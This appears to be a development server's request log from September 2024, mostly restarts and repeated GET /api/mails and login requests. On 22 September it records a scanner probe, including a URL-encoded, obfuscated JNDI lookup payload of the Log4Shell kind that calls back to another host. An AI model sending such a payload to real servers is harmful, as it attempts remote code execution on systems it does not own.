2024-09-20T06:37:55.853Z info: Server is running on port 5000
2024-09-20T06:38:03.404Z info: GET /api/mails
2024-09-20T06:40:16.249Z info: Server is running on port 5000
2024-09-20T06:40:27.801Z info: GET /api/mails
2024-09-20T06:40:28.695Z info: GET /api/mails
2024-09-20T06:40:48.726Z info: GET /api/mails
2024-09-20T06:40:48.727Z info: GET /api/mails
2024-09-20T06:42:27.528Z info: GET /api/mails
2024-09-20T06:42:27.529Z info: GET /api/mails
2024-09-20T06:42:45.432Z info: GET /api/mails
2024-09-20T06:42:45.433Z info: GET /api/mails
2024-09-20T06:54:44.144Z info: GET /api/mails
2024-09-20T06:54:44.145Z info: GET /api/mails
2024-09-20T06:54:50.255Z info: GET /api/mails
2024-09-20T06:54:50.257Z info: GET /api/mails
2024-09-20T06:55:53.220Z info: GET /api/mails
2024-09-20T06:55:53.221Z info: GET /api/mails
2024-09-20T06:56:33.244Z info: GET /api/mails
2024-09-20T06:56:33.246Z info: GET /api/mails
2024-09-20T06:58:07.557Z info: Server is running on port 5000
2024-09-20T06:58:21.175Z info: GET /api/mails
2024-09-20T06:58:21.179Z info: GET /api/mails
2024-09-20T06:58:33.804Z info: Server is running on port 5000
2024-09-20T06:58:55.096Z info: Server is running on port 5000
2024-09-20T06:58:58.521Z info: GET /api/mails
2024-09-20T06:58:58.525Z info: GET /api/mails
2024-09-20T06:59:10.958Z info: Server is running on port 5000
2024-09-20T06:59:15.344Z info: GET /api/mails
2024-09-20T06:59:15.348Z info: GET /api/mails
2024-09-20T07:01:10.927Z info: GET /api/mails
2024-09-20T07:01:10.929Z info: GET /api/mails
2024-09-20T07:11:10.190Z info: Server is running on port 5000
2024-09-20T07:11:49.884Z info: GET /api/mails
2024-09-20T07:11:49.888Z info: GET /api/mails
2024-09-20T07:12:31.136Z info: GET /api/mails
2024-09-20T07:12:31.137Z info: GET /api/mails
2024-09-20T07:12:52.611Z info: GET /api/mails
2024-09-20T07:12:52.612Z info: GET /api/mails
2024-09-20T07:31:26.757Z info: GET /api/mails
2024-09-20T07:31:26.759Z info: GET /api/mails
2024-09-20T15:34:30.802Z info: GET /api/mails
2024-09-20T15:34:30.812Z info: GET /api/mails
2024-09-20T15:55:40.788Z info: GET /api/mails
2024-09-20T15:55:40.791Z info: GET /api/mails
2024-09-20T16:33:42.786Z info: GET /api/mails
2024-09-20T16:33:42.791Z info: GET /api/mails
2024-09-20T16:36:23.791Z info: GET /api/mails
2024-09-20T16:36:23.794Z info: GET /api/mails
2024-09-20T18:45:03.129Z info: GET /api/mails
2024-09-20T18:45:03.137Z info: GET /api/mails
2024-09-20T18:45:09.173Z info: GET /api/mails
2024-09-20T18:45:09.175Z info: GET /api/mails
2024-09-20T18:46:20.253Z info: GET /api/mails
2024-09-20T18:46:20.256Z info: GET /api/mails
2024-09-20T18:48:21.157Z info: GET /api/mails
2024-09-20T18:48:21.160Z info: GET /api/mails
2024-09-20T18:50:42.832Z info: GET /api/mails
2024-09-20T18:50:42.834Z info: GET /api/mails
2024-09-20T18:58:38.291Z info: GET /api/mails
2024-09-20T18:58:38.295Z info: GET /api/mails
2024-09-20T18:59:03.772Z info: GET /api/mails
2024-09-20T18:59:03.775Z info: GET /api/mails
2024-09-20T18:59:32.537Z info: Server is running on port 5000
2024-09-20T18:59:38.933Z info: GET /api/mails
2024-09-20T18:59:38.939Z info: GET /api/mails
2024-09-20T18:59:43.458Z info: Server is running on port 5000
2024-09-20T19:01:39.905Z info: GET /api/mails
2024-09-20T19:01:39.909Z info: GET /api/mails
2024-09-20T19:05:38.364Z info: GET /api/mails
2024-09-20T19:05:38.366Z info: GET /api/mails
2024-09-20T19:05:43.288Z info: GET /api/mails
2024-09-20T19:05:43.290Z info: GET /api/mails
2024-09-20T19:05:57.770Z info: GET /api/mails
2024-09-20T19:05:57.773Z info: GET /api/mails
2024-09-20T19:56:58.306Z info: GET /api/mails
2024-09-20T19:56:58.314Z info: GET /api/mails
2024-09-20T19:57:02.165Z info: GET /api/mails
2024-09-20T19:57:02.167Z info: GET /api/mails
2024-09-20T21:40:52.108Z info: GET /api/mails
2024-09-20T21:40:52.114Z info: GET /api/mails
2024-09-20T23:00:09.334Z info: Server is running on port 5000
2024-09-20T23:12:43.733Z info: Server is running on port 5000
2024-09-21T00:09:58.920Z info: Server is running on port 5000
2024-09-21T00:10:33.565Z info: GET /api/mails
2024-09-21T00:11:16.325Z info: Server is running on port 5000
2024-09-21T00:11:22.719Z info: GET /api/mails
2024-09-21T00:11:25.009Z info: GET /api/mails
2024-09-21T00:11:25.425Z info: GET /api/mails
2024-09-21T00:11:25.764Z info: GET /api/mails
2024-09-21T00:12:20.107Z info: GET /api/mails
2024-09-21T00:12:20.577Z info: GET /api/mails
2024-09-21T00:12:27.921Z info: GET /api/mail
2024-09-21T00:12:30.371Z info: GET /api/mails
2024-09-21T00:12:40.237Z info: GET /api/mails
2024-09-21T00:13:42.938Z info: Server is running on port 5000
2024-09-21T00:13:45.841Z info: GET /api/mails
2024-09-21T00:14:57.717Z info: Server is running on port 5000
2024-09-21T00:14:59.981Z info: GET /api/mails
2024-09-21T00:16:09.419Z info: Server is running on port 5000
2024-09-21T00:16:11.737Z info: GET /api/mails
2024-09-21T00:16:14.770Z info: GET /api/mails
2024-09-21T00:16:14.787Z info: GET /api/mails
2024-09-21T00:16:53.340Z info: Server is running on port 5000
2024-09-21T00:17:01.261Z info: Server is running on port 5000
2024-09-21T02:24:59.181Z info: GET /api/mails
2024-09-21T02:24:59.231Z info: GET /api/mails
2024-09-21T08:05:23.827Z info: GET /api/mails
2024-09-21T08:05:23.858Z info: GET /api/mails
2024-09-21T08:05:36.489Z info: GET /api/mails
2024-09-21T08:05:36.507Z info: GET /api/mails
2024-09-21T08:06:24.767Z info: Server is running on port 5000
2024-09-21T08:06:37.715Z info: GET /api/mails
2024-09-21T08:06:40.534Z info: GET /api/mails
2024-09-21T08:06:40.575Z info: GET /api/mails
2024-09-21T08:06:47.426Z info: GET /api/mails
2024-09-21T08:06:47.552Z info: GET /api/mails
2024-09-21T08:06:55.597Z info: GET /api/mails
2024-09-21T08:06:57.154Z info: GET /api/mails
2024-09-21T08:06:57.662Z info: GET /api/mails
2024-09-21T08:07:03.801Z info: GET /api/mails
2024-09-21T08:07:03.933Z info: GET /api/mails
2024-09-21T08:07:04.368Z info: GET /api/mails
2024-09-21T08:07:04.410Z info: GET /api/mails
2024-09-21T08:07:05.297Z info: GET /api/mails
2024-09-21T08:07:05.340Z info: GET /api/mails
2024-09-21T08:07:11.628Z info: GET /api/mails
2024-09-21T08:07:11.764Z info: GET /api/mails
2024-09-21T08:20:16.643Z info: Server is running on port 5000
2024-09-21T08:45:07.357Z info: Server is running on port 5000
2024-09-21T08:51:08.103Z info: GET /api/mails
2024-09-21T08:51:08.344Z info: GET /api/mails
2024-09-21T08:51:12.669Z info: GET /api/mails
2024-09-21T08:51:14.873Z info: GET /api/mails
2024-09-21T08:51:15.942Z info: GET /api/mails
2024-09-21T08:51:16.918Z info: GET /api/mails
2024-09-21T08:55:17.936Z info: GET /api/mails
2024-09-21T08:55:18.059Z info: GET /api/mails
2024-09-21T08:55:31.112Z info: GET /api/mails
2024-09-21T08:55:31.241Z info: GET /api/mails
2024-09-21T08:57:49.247Z info: GET /api/mails
2024-09-21T08:57:49.447Z info: GET /api/mails
2024-09-21T08:58:55.025Z info: Server is running on port 5000
2024-09-21T08:59:00.253Z info: GET /api/mails
2024-09-21T09:00:36.859Z info: Server is running on port 5000
2024-09-21T09:00:42.155Z info: GET /api/mails
2024-09-21T09:00:42.331Z info: GET /api/mails
2024-09-21T09:00:48.378Z info: GET /api/mails
2024-09-21T09:00:48.506Z info: GET /api/mails
2024-09-21T09:03:59.537Z info: GET /api/mails
2024-09-21T09:03:59.702Z info: GET /api/mails
2024-09-21T09:04:35.904Z info: GET /api/mails
2024-09-21T09:04:36.037Z info: GET /api/mails
2024-09-21T09:04:46.350Z info: GET /api/mails
2024-09-21T09:04:46.498Z info: GET /api/mails
2024-09-21T09:04:52.775Z info: GET /api/mails
2024-09-21T09:04:52.919Z info: GET /api/mails
2024-09-21T09:05:46.590Z info: GET /api/mails
2024-09-21T09:05:46.724Z info: GET /api/mails
2024-09-21T15:31:53.660Z info: GET /api/mails
2024-09-21T15:31:54.474Z info: GET /api/mails
2024-09-21T15:34:50.721Z info: GET /api/mails
2024-09-21T15:34:50.861Z info: GET /api/mails
2024-09-21T15:36:16.435Z info: GET /api/mails
2024-09-21T15:36:16.566Z info: GET /api/mails
2024-09-21T15:37:01.270Z info: GET /api/mails
2024-09-21T15:37:01.487Z info: GET /api/mails
2024-09-21T15:42:54.933Z info: GET /api/mails
2024-09-21T15:42:55.635Z info: GET /api/mails
2024-09-21T17:30:09.784Z info: Server is running on port 5000
2024-09-21T17:30:09.809Z info: GET /api/mails
2024-09-21T17:30:10.264Z info: GET /favicon.ico
2024-09-21T17:30:21.716Z info: GET /api/mails
2024-09-21T17:30:21.855Z info: GET /api/mails
2024-09-21T17:34:13.141Z info: GET /api/mails
2024-09-21T17:34:13.272Z info: GET /api/mails
2024-09-21T17:55:57.683Z info: GET /api/mails
2024-09-21T17:55:58.246Z info: GET /api/mails
2024-09-21T17:58:13.460Z info: GET /api/mails
2024-09-21T17:58:13.591Z info: GET /api/mails
2024-09-21T17:58:14.174Z info: GET /api/mails
2024-09-21T17:58:14.217Z info: GET /api/mails
2024-09-21T18:04:35.225Z info: GET /api/mails
2024-09-21T18:04:35.819Z info: GET /api/mails
2024-09-21T18:04:35.882Z info: GET /api/mails
2024-09-21T18:04:56.022Z info: GET /api/mails
2024-09-21T18:04:56.152Z info: GET /api/mails
2024-09-21T18:05:37.065Z info: GET /api/mails
2024-09-21T18:05:37.198Z info: GET /api/mails
2024-09-21T18:08:11.914Z info: GET /api/mails
2024-09-21T18:08:12.060Z info: GET /api/mails
2024-09-21T18:08:17.483Z info: GET /api/mails
2024-09-21T18:08:17.615Z info: GET /api/mails
2024-09-21T18:08:35.691Z info: GET /api/mails
2024-09-21T18:08:35.815Z info: GET /api/mails
2024-09-21T18:09:14.795Z info: GET /api/mails
2024-09-21T18:11:34.122Z info: GET /api/mails
2024-09-21T18:11:34.282Z info: GET /api/mails
2024-09-21T18:17:43.204Z info: GET /api/mails
2024-09-21T18:17:43.804Z info: GET /api/mails
2024-09-21T18:20:44.411Z info: GET /api/mails
2024-09-21T18:20:44.563Z info: GET /api/mails
2024-09-21T18:21:03.508Z info: GET /api/mails
2024-09-21T18:21:03.630Z info: GET /api/mails
2024-09-21T18:22:31.951Z info: GET /api/mails
2024-09-21T18:22:32.109Z info: GET /api/mails
2024-09-21T19:46:41.430Z info: GET /api/mails
2024-09-21T19:46:42.301Z info: GET /api/mails
2024-09-21T19:50:30.153Z info: GET /api/mails
2024-09-21T19:50:30.299Z info: GET /api/mails
2024-09-21T20:19:33.179Z info: GET /api/mails
2024-09-21T20:19:33.872Z info: GET /api/mails
2024-09-21T21:00:13.056Z info: GET /api/mails
2024-09-21T21:00:13.666Z info: GET /api/mails
2024-09-21T21:00:14.782Z info: GET /api/mails
2024-09-21T21:00:14.825Z info: GET /api/mails
2024-09-21T21:00:35.764Z info: GET /api/mails
2024-09-21T21:00:35.913Z info: GET /api/mails
2024-09-21T21:01:12.324Z info: GET /api/mails
2024-09-21T21:01:12.460Z info: GET /api/mails
2024-09-22T01:17:47.353Z info: Server is running on port 5000
2024-09-22T01:17:51.965Z info: GET /api/mails
2024-09-22T01:17:52.493Z info: GET /favicon.ico
2024-09-22T01:17:55.706Z info: GET /api/mails
2024-09-22T01:17:55.760Z info: GET /api/mails
2024-09-22T01:23:09.680Z info: GET /api/mails
2024-09-22T01:23:09.860Z info: GET /api/mails
2024-09-22T01:26:08.722Z info: GET /api/mails
2024-09-22T01:26:08.900Z info: GET /api/mails
2024-09-22T01:32:38.595Z info: GET /api/mails
2024-09-22T01:32:40.069Z info: GET /api/mails
2024-09-22T01:33:23.263Z info: GET /api/mails
2024-09-22T01:33:23.403Z info: GET /api/mails
2024-09-22T01:36:40.158Z info: GET /api/mails
2024-09-22T01:36:40.294Z info: GET /api/mails
2024-09-22T01:37:53.886Z info: GET /api/mails
2024-09-22T01:37:54.094Z info: GET /api/mails
2024-09-22T01:39:01.998Z info: GET /api/mails
2024-09-22T01:39:02.128Z info: GET /api/mails
2024-09-22T01:40:15.404Z info: GET /api/mails
2024-09-22T01:40:15.530Z info: GET /api/mails
2024-09-22T01:41:08.268Z info: GET /api/mails
2024-09-22T01:41:08.397Z info: GET /api/mails
2024-09-22T02:12:05.250Z info: GET /api/mails
2024-09-22T02:12:06.716Z info: GET /api/mails
2024-09-22T02:17:29.629Z info: GET /api/mails
2024-09-22T02:17:30.279Z info: GET /api/mails
2024-09-22T02:18:20.991Z info: GET /api/mails
2024-09-22T02:18:21.122Z info: GET /api/mails
2024-09-22T02:19:34.623Z info: GET /api/mails
2024-09-22T02:19:34.759Z info: GET /api/mails
2024-09-22T02:20:16.569Z info: GET /api/mails
2024-09-22T02:20:16.693Z info: GET /api/mails
2024-09-22T15:44:37.889Z info: POST /onvif/device_service
2024-09-22T15:44:42.918Z info: GET /
2024-09-22T15:44:43.022Z info: GET /%24%7Bjnd%24%7B%3A%3A-i%7D%3Adns%3A%2F%2F192.168.1.254%3A41146%2FKZvHjaPoPZMkqfyHeKDjBgWyFnGYKfaS%7D
2024-09-22T15:44:53.065Z info: POST /
2024-09-22T18:49:35.885Z info: Server is running on port 5000
2024-09-22T18:49:41.541Z info: GET /api/mails
2024-09-22T18:49:42.093Z info: GET /favicon.ico
2024-09-22T18:56:06.243Z info: GET /api/mails
2024-09-22T18:56:06.875Z info: GET /api/mails
2024-09-22T20:58:10.918Z info: Server is running on port 5000
2024-09-22T21:00:45.868Z info: GET /api/mails
2024-09-22T21:00:46.801Z info: GET /favicon.ico
2024-09-22T21:01:29.543Z info: GET /api/mails
2024-09-22T21:01:29.675Z info: GET /api/mails
2024-09-22T21:02:04.035Z info: GET /api/mails
2024-09-22T21:02:04.209Z info: GET /api/mails
2024-09-22T21:05:06.978Z info: GET /api/auth/login
2024-09-22T21:08:06.378Z info: Server is running on port 5000
2024-09-22T21:10:56.020Z info: Server is running on port 5000
2024-09-22T21:11:00.821Z info: POST /api/auth/login
2024-09-22T21:35:49.479Z info: POST /api/auth/login
2024-09-22T21:38:51.557Z info: Server is running on port 5000
2024-09-22T21:39:21.707Z info: Server is running on port 5000
2024-09-22T21:39:26.599Z info: POST /api/auth/login
2024-09-22T22:02:30.716Z info: GET /api/mails
2024-09-22T22:02:31.615Z info: GET /api/mails
2024-09-22T22:10:33.997Z info: GET /api/mails
2024-09-22T22:10:34.668Z info: GET /api/mails
2024-09-22T22:23:14.925Z info: Server is running on port 5000
2024-09-22T22:44:24.720Z info: Server is running on port 5000
2024-09-22T22:45:05.515Z info: POST /api/auth/login
2024-09-22T22:45:19.538Z info: POST /api/auth/login
2024-09-22T22:45:59.762Z info: Server is running on port 5000
2024-09-22T22:46:15.023Z info: POST /api/auth/login
2024-09-22T22:46:26.073Z info: GET /api/mails
2024-09-22T22:46:26.767Z info: GET /api/mails
2024-09-22T22:47:28.636Z info: Server is running on port 5000
2024-09-22T22:47:44.469Z info: POST /api/login
2024-09-22T22:47:47.975Z info: POST /api/login
2024-09-22T22:50:47.114Z info: POST /api/login
2024-09-22T22:56:58.808Z info: POST /api/login
2024-09-22T23:04:19.792Z info: Server is running on port 5000
2024-09-22T23:04:42.490Z info: Server is running on port 5000
2024-09-22T23:04:58.344Z info: POST /api/login
2024-09-22T23:05:18.337Z info: POST /api/auth/login
2024-09-22T23:05:20.949Z info: POST /api/auth/login
2024-09-22T23:54:38.397Z info: POST /api/auth/login
2024-09-22T23:54:50.601Z info: POST /api/auth/login
2024-09-22T23:55:18.556Z info: GET /api/mails
2024-09-22T23:55:19.185Z info: GET /api/mails
2024-09-23T01:04:19.882Z info: Server is running on port 5000
2024-09-23T01:04:25.237Z info: Server is running on port 5000
2024-09-23T01:04:32.746Z info: GET /api/mails
2024-09-23T01:04:32.751Z info: GET /api/mails
2024-09-23T01:05:35.925Z info: GET /api/mails
2024-09-23T01:05:35.927Z info: GET /api/mails
2024-09-23T01:16:56.529Z info: GET /api/mails
2024-09-23T01:16:56.532Z info: GET /api/mails
2024-09-23T01:17:21.244Z info: GET /api/mails
2024-09-23T01:17:21.245Z info: GET /api/mails
2024-09-23T01:24:44.817Z info: POST /api/auth/login
2024-09-23T01:24:47.619Z info: POST /api/auth/login
2024-09-23T01:26:27.041Z info: POST /api/auth/login
2024-09-23T01:26:27.680Z info: POST /api/auth/login
2024-09-23T01:26:28.168Z info: POST /api/auth/login
2024-09-23T01:26:28.703Z info: POST /api/auth/login
2024-09-23T01:26:31.926Z info: POST /api/auth/login
2024-09-23T01:32:04.706Z info: GET /api/mails
2024-09-23T01:32:04.710Z info: GET /api/mails
2024-09-23T01:32:10.756Z info: GET /api/mails
2024-09-23T01:32:10.757Z info: GET /api/mails
2024-09-23T01:35:31.946Z info: GET /api/mails
2024-09-23T01:35:31.951Z info: GET /api/mails
2024-09-23T01:59:01.572Z info: GET /api/mails
2024-09-23T01:59:01.574Z info: GET /api/mails
2024-09-23T03:11:45.283Z info: GET /api/mails
2024-09-23T03:11:45.284Z info: GET /api/mails
2024-09-23T03:12:52.306Z info: GET /api/mails
2024-09-23T03:12:52.307Z info: GET /api/mails
2024-09-23T03:15:38.014Z info: GET /api/mails
2024-09-23T03:15:38.016Z info: GET /api/mails
2024-09-23T16:29:59.333Z info: Server is running on port 5000
2024-09-23T16:30:04.672Z info: GET /api/mails
2024-09-23T16:30:04.676Z info: GET /api/mails
2024-09-23T16:32:07.281Z info: Server is running on port 5000
2024-09-23T16:36:11.234Z info: GET /api/mails
2024-09-23T16:36:11.238Z info: GET /api/mails
2024-09-23T17:27:39.240Z info: Server is running on port 5000
2024-09-23T17:27:46.483Z info: Server is running on port 5000
2024-09-23T17:28:00.625Z info: Server is running on port 5000
2024-09-23T17:28:04.993Z info: GET /api/mails
2024-09-23T17:28:04.999Z info: GET /api/mails
2024-09-23T17:28:13.750Z info: GET /api/mails
2024-09-23T17:28:13.752Z info: GET /api/mails
